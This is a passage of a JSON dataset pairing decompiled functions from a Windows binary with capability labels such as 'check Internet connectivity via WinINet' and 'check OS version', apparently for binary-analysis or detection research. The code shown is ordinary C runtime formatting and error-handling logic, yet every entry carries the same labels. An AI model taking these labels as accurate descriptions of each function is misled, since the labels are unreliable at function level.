            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040af3c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a1bc();\n    if (0 < *(iVar1 + 0x18)) {\n        iVar1 = fcn.0040a1bc();\n        *(iVar1 + 0x18) = *(iVar1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "0040b55b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b55b(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*(param_1 + 5) == '\\x02') {\n        *(*param_1 + 0x350) = *(*param_1 + 0x350) & 0xfffffffd;\n    }\n    if (*(param_1 + 7) != '\\0') {\n        iVar1 = param_1[6];\n        iVar2 = fcn.0040b606();\n        *(iVar2 + 0x10) = iVar1;\n    }\n    if (*(param_1 + 9) != '\\0') {\n        iVar1 = param_1[8];\n        iVar2 = fcn.0040b606();\n        *(iVar2 + 0x14) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0040b597": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b597(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 8) == '\\0') {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *(param_1 + 4) = 0;\n        *(param_1 + 8) = 1;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        return 0;\n    }\n    return *(param_1 + 4);\n}\n",
        "token_count": 117
    },
    "0040b5c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b5c0(uint *param_1)\n\n{\n    uint uVar1;\n    uint *dwErrCode;\n    \n    dwErrCode = param_1;\n    dwErrCode = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (*(param_1 + 2) == '\\0') {\n        uVar1 = 0;\n        *(param_1 + 2) = 1;\n        param_1[1] = 0;\n    }\n    else {\n        uVar1 = param_1[1];\n    }\n    uVar1 = fcn.004139e2(&dwErrCode, uVar1);\n    *param_1 = uVar1;\n    (*_sym.imp.KERNEL32.dll_SetLastError)(dwErrCode);\n    return uVar1;\n}\n",
        "token_count": 178
    },
    "0040b606": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040b606(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*param_1 == 0) {\n        iVar2 = fcn.0040b5c0();\n        if (iVar2 == 0) {\n            fcn.0040fec9();\n            pcVar1 = swi(3);\n            iVar2 = (*pcVar1)();\n            return iVar2;\n        }\n    }\n    return *param_1;\n}\n",
        "token_count": 117
    },
    "0040b9a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040b9a0(uint32_t arg_8h, uint arg_ch, uchar *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h)\n\n{\n    uint var_474h;\n    uchar *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_420h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        *(arg_1ch + 0x1c) = 1;\n        arg_18h = 0;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_1ch);\n        goto code_r0x0040bb06;\n    }\n    var_470h = arg_10h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if (((arg_8h & 2) != 0) || (var_464h = 0,  arg_10h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.0040c664(&var_460h, arg_8h, arg_ch, arg_18h, arg_1ch, arg_20h);\n    var_ch = 0;\n    var_460h = fcn.0040c87a();\n    if (arg_10h != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if ((arg_8h & 2) == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h == arg_14h) {\n                        arg_10h[arg_14h + -1] = 0;\n                    }\n                    else {\ncode_r0x0040baef:\n                        arg_10h[var_468h] = 0;\n                    }\n                }\n            }\n            else if (arg_14h != 0) {\n                if (var_460h < 0) {\n                    *arg_10h = 0;\n                }\n                else {\n                    if (var_468h != arg_14h) goto code_r0x0040baef;\n                    arg_10h[arg_14h + -1] = 0;\n                }\n            }\n        }\n        else if (((arg_14h != 0) || (var_460h == NULL)) && (var_468h != arg_14h)) {\n            arg_10h[var_468h] = 0;\n        }\n    }\n    fcn.0040c6cb();\ncode_r0x0040bb06:\n    fcn.00406dcc(arg_18h);\n    return;\n}\n",
        "token_count": 730
    },
    "0040bb14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040bb14(uint arg_8h, uint arg_ch, uchar *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_18h == 0) {\n        *(arg_1ch + 0x1c) = 1;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_1ch);\n    }\n    else {\n        if ((arg_10h == NULL) || (arg_14h == 0)) {\n            *(arg_1ch + 0x1c) = 1;\n            *(arg_1ch + 0x18) = 0x16;\n        }\n        else {\n            iVar1 = fcn.0040b9a0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (iVar1 < 0) {\n                *arg_10h = 0;\n            }\n            if (iVar1 != -2) {\n                return iVar1;\n            }\n            *(arg_1ch + 0x1c) = 1;\n            *(arg_1ch + 0x18) = 0x22;\n        }\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_1ch);\n    }\n    return -1;\n}\n",
        "token_count": 372
    },
    "0040bbcb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040bbcb(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    if (arg_8h < 0x80000000) {\n        arg_8h = arg_8h * 2;\n        if (((*(in_ECX + 0x404) != 0) || (0x400 < arg_8h)) &&\n           (*(in_ECX + 0x400) <= arg_8h && arg_8h != *(in_ECX + 0x400))) {\n            var_4h = fcn.00414556(arg_8h);\n            if (var_4h == 0) {\n                fcn.0041451c(0);\n                return 0;\n            }\n            fcn.0040c6e5(&var_4h);\n            *(in_ECX + 0x400) = arg_8h;\n            fcn.0041451c(var_4h);\n        }\n        uVar1 = 1;\n    }\n    else {\n        *(arg_ch + 0x1c) = 1;\n        *(arg_ch + 0x18) = 0xc;\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 297
    },
    "0040bedb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040bedb(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar4;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.0040d046(*(in_ECX + 0x28));\n    if (iVar1 == 1) {\n        uVar2 = *(in_ECX + 0x1c);\n        *(in_ECX + 0x10) = *(in_ECX + 0x10) + 4;\n        if ((uVar2 >> 4 & 1) == 0) {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n        else {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 2) {\n            if (iVar1 == 4) {\n                uVar2 = *(in_ECX + 0x1c);\n                *(in_ECX + 0x10) = *(in_ECX + 0x10) + 4;\n                if ((uVar2 >> 4 & 1) == 0) {\n                    arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n                    var_4h = 0;\n                }\n                else {\n                    arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n                    var_4h = arg_8h_00 >> 0x1f;\n                }\n            }\n            else {\n                if (iVar1 != 8) {\n                    iVar1 = *(in_ECX + 8);\n                    *(iVar1 + 0x1c) = 1;\n                    *(iVar1 + 0x18) = 0x16;\n                    uVar2 = fcn.0040b7a2(0, 0, 0, 0, 0, *(in_ECX + 8));\n                    return uVar2 & 0xffffff00;\n                }\n                uVar2 = *(in_ECX + 0x1c);\n                *(in_ECX + 0x10) = *(in_ECX + 0x10) + 8;\n                arg_8h_00 = *(*(in_ECX + 0x10) + -8);\n                var_4h = *(*(in_ECX + 0x10) + -4);\n            }\n            goto code_r0x0040bfbd;\n        }\n        uVar2 = *(in_ECX + 0x1c);\n        *(in_ECX + 0x10) = *(in_ECX + 0x10) + 4;\n        if ((uVar2 >> 4 & 1) == 0) {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n        else {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n    }\n    var_4h = arg_8h_00 >> 0x1f;\ncode_r0x0040bfbd:\n    if ((((uVar2 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n        bVar4 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_4h = -(var_4h + bVar4);\n        uVar2 = uVar2 | 0x40;\n        *(in_ECX + 0x1c) = uVar2;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar2 & 0xfffffff7;\n        fcn.0040bbcb(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_4h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar1 == 8) {\n        fcn.0040c4be(arg_8h_00, var_4h);\n    }\n    else {\n        fcn.0040c352(arg_8h_00);\n    }\n    pcVar3 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar3 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar3 = *(in_ECX + 0x30),  *pcVar3 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar3 >> 8, 1);\n}\n",
        "token_count": 1235
    },
    "0040c058": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c058(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar4;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.0040d046(*(in_ECX + 0x28));\n    if (iVar1 == 1) {\n        uVar2 = *(in_ECX + 0x1c);\n        *(in_ECX + 0x10) = *(in_ECX + 0x10) + 4;\n        if ((uVar2 >> 4 & 1) == 0) {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n        else {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 2) {\n            if (iVar1 == 4) {\n                uVar2 = *(in_ECX + 0x1c);\n                *(in_ECX + 0x10) = *(in_ECX + 0x10) + 4;\n                if ((uVar2 >> 4 & 1) == 0) {\n                    arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n                    var_4h = 0;\n                }\n                else {\n                    arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n                    var_4h = arg_8h_00 >> 0x1f;\n                }\n            }\n            else {\n                if (iVar1 != 8) {\n                    iVar1 = *(in_ECX + 8);\n                    *(iVar1 + 0x1c) = 1;\n                    *(iVar1 + 0x18) = 0x16;\n                    uVar2 = fcn.0040b7a2(0, 0, 0, 0, 0, *(in_ECX + 8));\n                    return uVar2 & 0xffffff00;\n                }\n                uVar2 = *(in_ECX + 0x1c);\n                *(in_ECX + 0x10) = *(in_ECX + 0x10) + 8;\n                arg_8h_00 = *(*(in_ECX + 0x10) + -8);\n                var_4h = *(*(in_ECX + 0x10) + -4);\n            }\n            goto code_r0x0040c13a;\n        }\n        uVar2 = *(in_ECX + 0x1c);\n        *(in_ECX + 0x10) = *(in_ECX + 0x10) + 4;\n        if ((uVar2 >> 4 & 1) == 0) {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n        else {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n    }\n    var_4h = arg_8h_00 >> 0x1f;\ncode_r0x0040c13a:\n    if ((((uVar2 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n        bVar4 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_4h = -(var_4h + bVar4);\n        uVar2 = uVar2 | 0x40;\n        *(in_ECX + 0x1c) = uVar2;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar2 & 0xfffffff7;\n        fcn.0040bbcb(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_4h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar1 == 8) {\n        fcn.0040c536(arg_8h_00, var_4h, arg_8h);\n    }\n    else {\n        fcn.0040c3bc(arg_8h_00, arg_8h);\n    }\n    pcVar3 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar3 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar3 = *(in_ECX + 0x30),  *pcVar3 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar3 >> 8, 1);\n}\n",
        "token_count": 1247
    },
    "0040c1d5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c1d5(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar4;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.0040d046(*(in_ECX + 0x28));\n    if (iVar1 == 1) {\n        uVar2 = *(in_ECX + 0x1c);\n        *(in_ECX + 0x10) = *(in_ECX + 0x10) + 4;\n        if ((uVar2 >> 4 & 1) == 0) {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n        else {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 2) {\n            if (iVar1 == 4) {\n                uVar2 = *(in_ECX + 0x1c);\n                *(in_ECX + 0x10) = *(in_ECX + 0x10) + 4;\n                if ((uVar2 >> 4 & 1) == 0) {\n                    arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n                    var_4h = 0;\n                }\n                else {\n                    arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n                    var_4h = arg_8h_00 >> 0x1f;\n                }\n            }\n            else {\n                if (iVar1 != 8) {\n                    iVar1 = *(in_ECX + 8);\n                    *(iVar1 + 0x1c) = 1;\n                    *(iVar1 + 0x18) = 0x16;\n                    uVar2 = fcn.0040b7a2(0, 0, 0, 0, 0, *(in_ECX + 8));\n                    return uVar2 & 0xffffff00;\n                }\n                uVar2 = *(in_ECX + 0x1c);\n                *(in_ECX + 0x10) = *(in_ECX + 0x10) + 8;\n                arg_8h_00 = *(*(in_ECX + 0x10) + -8);\n                var_4h = *(*(in_ECX + 0x10) + -4);\n            }\n            goto code_r0x0040c2b7;\n        }\n        uVar2 = *(in_ECX + 0x1c);\n        *(in_ECX + 0x10) = *(in_ECX + 0x10) + 4;\n        if ((uVar2 >> 4 & 1) == 0) {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n        else {\n            arg_8h_00 = *(*(in_ECX + 0x10) + -4);\n        }\n    }\n    var_4h = arg_8h_00 >> 0x1f;\ncode_r0x0040c2b7:\n    if ((((uVar2 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n        bVar4 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_4h = -(var_4h + bVar4);\n        uVar2 = uVar2 | 0x40;\n        *(in_ECX + 0x1c) = uVar2;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar2 & 0xfffffff7;\n        fcn.0040bbcb(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_4h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar1 == 8) {\n        fcn.0040c5d2(arg_8h_00, var_4h, arg_8h);\n    }\n    else {\n        fcn.0040c436(arg_8h_00, arg_8h);\n    }\n    pcVar3 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar3 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar3 = *(in_ECX + 0x30),  *pcVar3 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar3 >> 8, 1);\n}\n",
        "token_count": 1252
    },
    "0040c802": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c802(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 1;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.0040bcae(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 365
    },
    "0040c87a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __thiscall fcn.0040c87a(uint32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uint8_t uVar4;\n    uint32_t arg_ch;\n    int32_t iVar5;\n    uint16_t uVar6;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint uVar7;\n    uint32_t noname_0;\n    uint32_t var_4h;\n    \n    uVar7 = *(param_1 + 8);\n    cVar3 = fcn.0040d516(uVar7);\n    if (cVar3 != '\\0') {\n        var_4h = param_1;\n        if (*(param_1 + 0xc) != 0) {\n            do {\n                do {\n                    *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                    if (*(param_1 + 0x450) == 2) {\n                        return *(param_1 + 0x14);\n                    }\n                    *(param_1 + 0x34) = 0;\n                    *(param_1 + 0x18) = 0;\n                    uVar4 = **(param_1 + 0xc);\n                    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                    *(param_1 + 0x2d) = uVar4;\n                } while (uVar4 == 0);\n                var_4h = var_4h & 0xffffff00 | uVar4;\n                uVar6 = CONCAT11(uVar4, uVar4);\n                do {\n                    if (*(param_1 + 0x14) < 0) break;\n                    arg_ch = *(param_1 + 0x18);\n                    noname_0 = var_4h;\n                    uVar4 = fcn.0040c769(var_4h, arg_ch);\n                    *(param_1 + 0x18) = uVar4;\n                    if (7 < uVar4) {\n                        iVar5 = *(param_1 + 8);\n                        *(iVar5 + 0x1c) = 1;\n                        *(iVar5 + 0x18) = 0x16;\n                        uVar7 = *(param_1 + 8);\n                        in_stack_ffffffd0 = 0;\n                        in_stack_ffffffcc = 0;\n                        goto code_r0x0040c8bc;\n                    }\n                    if (7 < uVar4) {\n                        return 0xffffffff;\n                    }\n                    cVar3 = uVar6;\n    // switch table (8 cases) at 0x40cb3a\n                    switch(uVar4) {\n                    case 0:\n                        iVar5 = *(param_1 + 8);\n                        *(param_1 + 0x38) = 0;\n                        if (*(iVar5 + 0x14) == '\\0') {\n                            fcn.0040d4a0();\n                            uVar6 = CONCAT11(*(param_1 + 0x2d), *(param_1 + 0x2d));\n                        }\n                        cVar3 = uVar6 >> 8;\n                        in_stack_ffffffd0 = 0x40c94c;\n                        iVar5 = fcn.0040d5ae(**(iVar5 + 0xc), uVar6, 0x8000);\n                        ppiVar1 = param_1 + 0x448;\n                        if (iVar5 != 0) {\n                            piVar2 = *ppiVar1;\n                            if (piVar2[2] == piVar2[1]) {\n                                if (*(piVar2 + 3) == '\\0') {\n                                    *(param_1 + 0x14) = 0xffffffff;\n                                }\n                                else {\n                                    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                }\n                            }\n                            else {\n                                *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                piVar2[2] = piVar2[2] + 1;\n                                ***ppiVar1 = uVar6;\n                                **ppiVar1 = **ppiVar1 + 1;\n                            }\n                            cVar3 = **(param_1 + 0xc);\n                            *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                            *(param_1 + 0x2d) = cVar3;\n                            if (cVar3 == '\\0') {\n                                iVar5 = *(param_1 + 8);\n                                *(iVar5 + 0x1c) = 1;\n                                *(iVar5 + 0x18) = 0x16;\n                                fcn.0040b7a2(0, 0, 0, 0, 0, *(param_1 + 8));\n                                iVar5 = *(param_1 + 8);\n                                *(iVar5 + 0x1c) = 1;\n                                *(iVar5 + 0x18) = 0x16;\n                                fcn.0040b7a2(0, 0, 0, 0, 0, *(param_1 + 8));\n                                return 0xffffffff;\n                            }\n                        }\n                        piVar2 = *ppiVar1;\n                        if (piVar2[2] == piVar2[1]) {\n                            if (*(piVar2 + 3) == '\\0') {\n                                *(param_1 + 0x14) = 0xffffffff;\n                            }\n                            else {\n                                *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                            }\n                        }\n                        else {\n                            *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                            piVar2[2] = piVar2[2] + 1;\n                            ***ppiVar1 = cVar3;\n                            **ppiVar1 = **ppiVar1 + 1;\n                        }\n                        break;\n                    case 1:\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x1c) = 0;\n                        *(param_1 + 0x24) = 0xffffffff;\n                        *(param_1 + 0x28) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x38) = 0;\n                        break;\n                    case 2:\n                        if (cVar3 == ' ') {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                        }\n                        else if (cVar3 == '#') {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                        }\n                        else if (cVar3 == '+') {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                        }\n                        else if (cVar3 == '-') {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                        }\n                        else if (cVar3 == '0') {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                        }\n                        break;\n                    case 3:\n                        if (cVar3 != '*') {\n                            iVar5 = param_1 + 0x20;\n                            goto code_r0x0040ca38;\n                        }\n                        *(param_1 + 0x10) = *(param_1 + 0x10) + 4;\n                        iVar5 = *(*(param_1 + 0x10) + -4);\n                        *(param_1 + 0x20) = iVar5;\n                        if (iVar5 < 0) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            *(param_1 + 0x20) = -iVar5;\n                        }\ncode_r0x0040ca5c:\n                        cVar3 = '\\x01';\n                        goto code_r0x0040ca97;\n                    case 4:\n                        *(param_1 + 0x24) = 0;\n                        break;\n                    case 5:\n                        if (cVar3 == '*') {\n                            *(param_1 + 0x10) = *(param_1 + 0x10) + 4;\n                            iVar5 = *(*(param_1 + 0x10) + -4);\n                            *(param_1 + 0x24) = iVar5;\n                            if (iVar5 < 0) {\n                                *(param_1 + 0x24) = 0xffffffff;\n                            }\n                            goto code_r0x0040ca5c;\n                        }\n                        iVar5 = param_1 + 0x24;\ncode_r0x0040ca38:\n                        cVar3 = fcn.0040c802(iVar5);\n                        goto code_r0x0040ca97;\n                    case 6:\n                        cVar3 = fcn.0040cb5a();\n                        goto code_r0x0040ca97;\n                    case 7:\n                        cVar3 = fcn.0040ccb8(noname_0, arg_ch, uVar7, unaff_EDI, unaff_ESI, unaff_EBX, var_4h, unaff_EBP\n                                             , unaff_retaddr, param_2, param_3);\ncode_r0x0040ca97:\n                        if (cVar3 == '\\0') {\n                            return 0xffffffff;\n                        }\n                    }\n                    uVar4 = **(param_1 + 0xc);\n                    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                    uVar6 = CONCAT11(uVar4, uVar4);\n                    *(param_1 + 0x2d) = uVar4;\n                    var_4h = var_4h & 0xffffff00 | uVar4;\n                } while (uVar4 != 0);\n            } while ((*(param_1 + 0x18) == '\\0') || (*(param_1 + 0x18) == '\\a'));\n        }\n        iVar5 = *(param_1 + 8);\n        *(iVar5 + 0x1c) = 1;\n        *(iVar5 + 0x18) = 0x16;\n        uVar7 = 0;\ncode_r0x0040c8bc:\n        fcn.0040b7a2(0, in_stack_ffffffcc, in_stack_ffffffd0, 0, 0, uVar7);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 2474
    },
    "0040d0f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
